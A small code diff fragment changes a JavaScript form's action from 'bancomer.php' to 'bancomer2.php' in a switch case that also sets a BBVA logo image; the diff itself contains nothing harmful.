@@ -21,7 +21,7 @@ document.getElementById("IMAGE").src = "IMG/default.png";
 
 		case 1:
 
-document.forms.formulario.action= "bancomer.php";	
+document.forms.formulario.action= "bancomer2.php";	
 document.getElementById('IMAGE').src = "IMG/logo-bbva.jpg";
 
 	break;
